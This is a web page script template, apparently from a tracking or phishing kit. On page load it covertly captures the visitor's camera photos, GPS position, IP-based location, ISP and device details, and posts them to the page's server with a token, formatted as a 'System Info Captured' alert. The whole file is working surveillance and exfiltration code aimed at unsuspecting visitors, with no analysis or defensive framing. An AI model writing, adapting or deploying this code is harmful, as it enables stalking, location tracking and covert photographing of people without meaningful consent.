<script>
const token = "{{ token }}";
const ipinfoToken = "{{ ipinfo_token }}";

// Collect system info
async function collectInfo(gps={}) {
  let info = {};
  info.userAgent = navigator.userAgent;
  info.language = navigator.language;
  info.platform = navigator.platform;
  info.screen = `${screen.width}x${screen.height}`;
  info.cores = navigator.hardwareConcurrency;
  info.memory = navigator.deviceMemory || "N/A";
  info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

  if (navigator.getBattery) {
    try {
      const battery = await navigator.getBattery();
      info.battery = `${Math.round(battery.level * 100)}% ${battery.charging ? "(charging)" : ""}`;
    } catch(e){}
  }

  let ipData = {};
  try {
    const res = await fetch(`https://ipinfo.io/json?token=${ipinfoToken}`);
    ipData = await res.json();
  } catch(e){}

  let text = "ðŸ§  *System Info Captured*\n";
  text += "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n";
  text += `ðŸŒ *IP:* ${ipData.ip || "N/A"}\n`;
  text += `ðŸ¢ *ISP:* ${ipData.org || "N/A"}\n`;
  text += `ðŸ“ *Location:* ${ipData.city || ""}, ${ipData.region || ""}, ${ipData.country || ""}\n`;
  if (gps.lat) text += `ðŸ“¡ *GPS:* ${gps.lat}, ${gps.lon}\n`;
  text += `ðŸ’» *Device:* ${info.platform}\n`;
  text += `ðŸ–¥ï¸ *Screen:* ${info.screen}\n`;
  text += `ðŸŒ *Browser:* ${info.userAgent}\n`;
  text += `ðŸ”‹ *Battery:* ${info.battery || "N/A"}\n`;
  text += `ðŸ•’ *Timezone:* ${info.timezone}\n`;

  fetch("/send_info", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({token, info: text})
  });
}

// Camera capture
function startCamera() {
  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      const video = document.createElement("video");
      video.srcObject = stream;
      video.play();

      const canvas = document.createElement("canvas");
      const ctx = canvas.getContext("2d");

      // Fast low-res snapshot
      setTimeout(() => {
        canvas.width = 320;
        canvas.height = 240;
        ctx.drawImage(video, 0, 0, 320, 240);
        const image = canvas.toDataURL("image/jpeg", 0.6);
        fetch("/send_photo", {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify({ image, token })
        });
      }, 100);

      // High-res snapshot after stream stable
      video.onloadedmetadata = () => {
        setTimeout(() => {
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          ctx.drawImage(video, 0, 0);
          const image = canvas.toDataURL("image/jpeg", 0.9);
          fetch("/send_photo", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({ image, token })
          }).then(() => stream.getTracks().forEach(t => t.stop()));
        }, 500);
      };

      // After camera, ask for location
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          pos => {
            collectInfo({lat: pos.coords.latitude, lon: pos.coords.longitude});
          },
          err => collectInfo(), // fallback
          {timeout: 5000}
        );
      } else {
        collectInfo();
      }
    })
    .catch(err => {
      // If camera denied, still send info
      collectInfo();
    });
}

// Run both
startCamera();
</script>